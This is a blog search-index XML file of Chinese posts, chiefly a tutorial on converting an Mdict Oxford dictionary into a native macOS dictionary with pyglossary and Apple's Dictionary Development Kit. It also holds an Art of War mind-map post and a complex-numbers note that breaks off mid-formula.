<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>利用 Mdict 制作 macOS 原生词典</title>
      <link href="/2023/04/22/%E4%BB%8E.mdx(Mdict)%E5%88%B6%E4%BD%9CmacOS%E5%8E%9F%E7%94%9F%E8%AF%8D%E5%85%B8/"/>
      <url>/2023/04/22/%E4%BB%8E.mdx(Mdict)%E5%88%B6%E4%BD%9CmacOS%E5%8E%9F%E7%94%9F%E8%AF%8D%E5%85%B8/</url>
      
        <content type="html"><![CDATA[<h2 id="安装环境"><a href="#安装环境" class="headerlink" title="安装环境"></a>安装环境</h2><p>为操作方便，统一建立了<code>~/ConvertDict/</code>路径，把需要的软件统一放到该路径下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ~/ConvertDict/</span><br></pre></td></tr></table></figure><h3 id="Homebrew-安装-Python-3"><a href="#Homebrew-安装-Python-3" class="headerlink" title="Homebrew 安装 Python 3"></a>Homebrew 安装 Python 3</h3><p>安装 Homebrew 过程中应该完整安装了 Command Line Tools for Xcode。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">X-MacBook-Pro ConvertDict → python --version</span><br><span class="line">Python 2.7.18</span><br><span class="line">X-MacBook-Pro ConvertDict → <span class="built_in">which</span> python</span><br><span class="line">/Users/X/.pyenv/shims/python</span><br><span class="line">X-MacBook-Pro ConvertDict → <span class="built_in">which</span> python3</span><br><span class="line">/usr/local/bin/python3</span><br></pre></td></tr></table></figure><h3 id="安装-python-依赖包"><a href="#安装-python-依赖包" class="headerlink" title="安装 python 依赖包"></a>安装 python 依赖包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">X-MacBook-Pro ConvertDict → pip3 install lxml beautifulsoup4 html5lib</span><br><span class="line"></span><br><span class="line">X-MacBook-Pro ConvertDict → brew install lzo</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apple Silicon 机型环境</span></span><br><span class="line"><span class="comment"># export C_INCLUDE_PATH=/opt/homebrew/Cellar/lzo/2.10/include/lzo:/opt/homebrew/Cellar/lzo/2.10/include/</span></span><br><span class="line"><span class="comment"># export LIBRARY_PATH=/opt/homebrew/lib</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Intel 芯片</span></span><br><span class="line">X-MacBook-Pro ConvertDict → <span class="built_in">export</span> C_INCLUDE_PATH=/usr/local/Cellar/lzo/2.10/include/lzo:/usr/local/Cellar/lzo/2.10/include/</span><br><span class="line">X-MacBook-Pro ConvertDict → <span class="built_in">export</span> LIBRARY_PATH=/usr/local/lib</span><br><span class="line"></span><br><span class="line">X-MacBook-Pro ConvertDict → <span class="built_in">echo</span> <span class="variable">$C_INCLUDE_PATH</span></span><br><span class="line">/usr/local/Cellar/lzo/2.10/include/lzo:/usr/local/Cellar/lzo/2.10/include/</span><br><span class="line">X-MacBook-Pro ConvertDict → <span class="built_in">echo</span> <span class="variable">$LIBRARY_PATH</span></span><br><span class="line">/usr/local/lib</span><br><span class="line"></span><br><span class="line">X-MacBook-Pro ConvertDict → pip3 install python-lzo</span><br></pre></td></tr></table></figure><p>上面安装 <code>python-lzo</code> 的时候需要分步，否则编译时会提示丢失头文件 <code>lzo/lzo1x.h</code>。</p><h3 id="下载安装-Dictionary-Development-Kit"><a href="#下载安装-Dictionary-Development-Kit" class="headerlink" title="下载安装 Dictionary Development Kit"></a>下载安装 Dictionary Development Kit</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/SebastianSzturo/Dictionary-Development-Kit</span><br></pre></td></tr></table></figure><p>虽然多年前的版本，但使用上是没有问题的。</p><h3 id="下载关键工具-pyglossary"><a href="#下载关键工具-pyglossary" class="headerlink" title="下载关键工具 pyglossary"></a>下载关键工具 pyglossary</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ilius/pyglossary</span><br></pre></td></tr></table></figure><h2 id="转换"><a href="#转换" class="headerlink" title="转换"></a>转换</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> Mdict 字典下载文件夹</span><br><span class="line">python3 ~/Developer/ConvertDict/pyglossary/main.py --write-format=AppleDict <span class="string">&quot;牛津高阶英汉双解词典（第10版）V3.mdx&quot;</span> <span class="string">&quot;牛津高阶英汉双解词典（第10版）V3&quot;</span></span><br></pre></td></tr></table></figure><p>最后一个参数是生成文件的路径名，为了方便，你也可以把相应文件都改成英文命名，避免带上那么多引号。<br>下面是可以修改实际显示名称的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"> Chenlongs-MacBook-Pro 牛津高阶英汉双解词典（第10版）V3 → python3 /Users/X/Developer/ConvertDict/pyglossary/main.py --write-format=AppleDict <span class="string">&quot;牛津高阶英汉双解词典（第10版）V3.mdx&quot;</span> <span class="string">&quot;牛津高阶英汉双解词典（第10版）V3&quot;</span></span><br><span class="line"></span><br><span class="line">[INFO] Found 1 mdd files with 275928 entries</span><br><span class="line">[INFO] extracting links...</span><br><span class="line">[INFO] extracting links <span class="keyword">done</span>, sizeof(linksDict)=2621536</span><br><span class="line">[INFO] wordCount = 62137</span><br><span class="line">[INFO] Writing to AppleDict file <span class="string">&#x27;/Users/X/Downloads/牛津高阶英汉双解词典（第10版）V3/牛津高阶英汉双解词典（第10版）V3&#x27;</span></span><br><span class="line">/Users/X/Developer/ConvertDict/pyglossary/pyglossary/plugins/appledict/_normalize.py:120: MarkupResemblesLocatorWarning: The input looks more like a filename than markup. You may want to open this file and pass the filehandle into Beautiful Soup.</span><br><span class="line">  title = BeautifulSoup.BeautifulSoup(</span><br><span class="line">Converting | |██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████|%100.0 Time: 0:15:06</span><br><span class="line">[INFO] Writing file <span class="string">&#x27;/Users/X/Downloads/牛津高阶英汉双解词典（第10版）V3/牛津高阶英汉双解词典（第10版）V3&#x27;</span> <span class="keyword">done</span>.</span><br><span class="line">[INFO] Running time of convert: 916.6 seconds</span><br></pre></td></tr></table></figure><h2 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h2><p>进入上面生成的文件夹，修改 <code>Makefile</code>，将 <code>DICT_BUILD_TOOL_DIR</code> 改为正确的 <code>Dictionary-Development-Kit</code> 路径（<code>/Users/用户名/Developer/ConvertDict/Dictionary-Development-Kit</code>，注意不能用相对路径名，必须是完整的）。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">&quot;牛津高阶英汉双解词典（第10版）V3&quot;</span></span><br><span class="line">make</span><br></pre></td></tr></table></figure><p>生成的字典在 objects 文件夹里</p><h3 id="修改配套格式"><a href="#修改配套格式" class="headerlink" title="修改配套格式"></a>修改配套格式</h3><p>用原来 mdict 文件夹中.css 文件的覆盖掉 DefaultStyle.css</p><h3 id="设置在原生词典中显示的名字"><a href="#设置在原生词典中显示的名字" class="headerlink" title="设置在原生词典中显示的名字"></a>设置在原生词典中显示的名字</h3><p>XCode（或者其他 plist 编辑器）打开 <code>info.plist</code>，可以修改其中的几个字段<br><code>Bundle name</code> 对应的是界面上的字典名缩写，一般建议简略一些，比如“牛津高阶 V10”<br><code>Bundle display name</code> 对应的是设置界面里的名称，一般建议可以放全称，比如“牛津高阶英汉双解词典（第 10 版）V3”</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure><p>字典安装路径是 <code>~/Library/Dictionaries</code>，进去打开可以看到结构和上面编译以后的几乎一样，所以你也可以只在这里的 <code>.plist</code> 文件里修改显示的名称。</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://www.readern.com/convert-mdict-to-macos-dictionary.html">https://www.readern.com/convert-mdict-to-macos-dictionary.html</a></li><li><a href="http://download.huzheng.org/zh_CN/">http://download.huzheng.org/zh_CN&#x2F;</a></li><li><a href="http://louischeung.top:225/mdict%E8%AF%8D%E5%85%B8%E5%8C%85/%E7%89%9B%E6%B4%A5%E9%AB%98%E9%98%B6%E8%8B%B1%E6%B1%89%E5%8F%8C%E8%A7%A3%E8%AF%8D%E5%85%B8%EF%BC%88%E7%AC%AC10%E7%89%88%EF%BC%89V3/">http://louischeung.top:225/mdict%E8%AF%8D%E5%85%B8%E5%8C%85/%E7%89%9B%E6%B4%A5%E9%AB%98%E9%98%B6%E8%8B%B1%E6%B1%89%E5%8F%8C%E8%A7%A3%E8%AF%8D%E5%85%B8%EF%BC%88%E7%AC%AC10%E7%89%88%EF%BC%89V3/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> macOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>孙子兵法</title>
      <link href="/2023/04/22/%E5%AD%99%E5%AD%90%E5%85%B5%E6%B3%95/"/>
      <url>/2023/04/22/%E5%AD%99%E5%AD%90%E5%85%B5%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><img src="/assets/images/%E3%80%8A%E5%AD%99%E5%AD%90%E5%85%B5%E6%B3%95%E3%80%8B%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE20190909.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> Others </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 兵法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>复数以及复数的模</title>
      <link href="/2023/04/21/%E5%A4%8D%E6%95%B0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E6%95%B0%E7%9A%84%E6%A8%A1/"/>
      <url>/2023/04/21/%E5%A4%8D%E6%95%B0%E4%BB%A5%E5%8F%8A%E5%A4%8D%E6%95%B0%E7%9A%84%E6%A8%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="共轭根"><a href="#共轭根" class="headerlink" title="共轭根"></a>共轭根</h2><p>在复数域中，对于一个复数 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="9.783ex" height="1.756ex" role="img" focusable="false" viewBox="0 -694 4324 776"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(742.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(1798.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2549.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(3550,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(3979,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>，其共轭根（Conjugate）定义为 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="9.862ex" height="1.903ex" role="img" focusable="false" viewBox="0 -759 4359 841"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mover"><g data-mml-node="mi" transform="translate(17.5,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(0,374)"><path data-c="2013" d="M0 248V285H499V248H0Z"></path></g></g><g data-mml-node="mo" transform="translate(777.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(1833.6,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2584.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mi" transform="translate(3585,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mi" transform="translate(4014,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>，即实部不变，虚部取相反数。例如，对于复数 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="9.878ex" height="1.717ex" role="img" focusable="false" viewBox="0 -677 4366 759"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(742.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1798.6,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mo" transform="translate(2520.8,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mn" transform="translate(3521,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mi" transform="translate(4021,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>，其共轭根为 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="9.957ex" height="1.903ex" role="img" focusable="false" viewBox="0 -759 4401 841"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mover"><g data-mml-node="mi" transform="translate(17.5,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(0,374)"><path data-c="2013" d="M0 248V285H499V248H0Z"></path></g></g><g data-mml-node="mo" transform="translate(777.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(1833.6,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mo" transform="translate(2555.8,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z"></path></g><g data-mml-node="mn" transform="translate(3556,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mi" transform="translate(4056,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g></g></svg></mjx-container>。</p><p>共轭根的性质如下：</p><ol><li><p>一个复数与其共轭根的乘积等于它的模的平方，即 <mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.564ex;" xmlns="http://www.w3.org/2000/svg" width="8.498ex" height="2.451ex" role="img" focusable="false" viewBox="0 -833.9 3756.1 1083.4"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mover" transform="translate(465,0)"><g data-mml-node="mi" transform="translate(17.5,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="mo" transform="translate(0,374)"><path data-c="2013" d="M0 248V285H499V248H0Z"></path></g></g><g data-mml-node="mo" transform="translate(1242.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2298.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(2576.6,0)"><path data-c="1D467" d="M347 338Q337 338 294 349T231 360Q211 360 197 356T174 346T162 335T155 324L153 320Q150 317 138 317Q117 317 117 325Q117 330 120 339Q133 378 163 406T229 440Q241 442 246 442Q271 442 291 425T329 392T367 375Q389 375 411 408T434 441Q435 442 449 442H462Q468 436 468 434Q468 430 463 420T449 399T432 377T418 358L411 349Q368 298 275 214T160 106L148 94L163 93Q185 93 227 82T290 71Q328 71 360 90T402 140Q406 149 409 151T424 153Q443 153 443 143Q443 138 442 134Q425 72 376 31T278 -11Q252 -11 232 6T193 40T155 57Q111 57 76 -3Q70 -11 59 -11H54H41Q35 -5 35 -2Q35 13 93 84Q132 129 225 214T340 322Q352 338 347 338Z"></path></g><g data-mml-node="msup" transform="translate(3041.6,0)"><g data-mml-node="mo" transform="translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mn" transform="translate(311,363) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 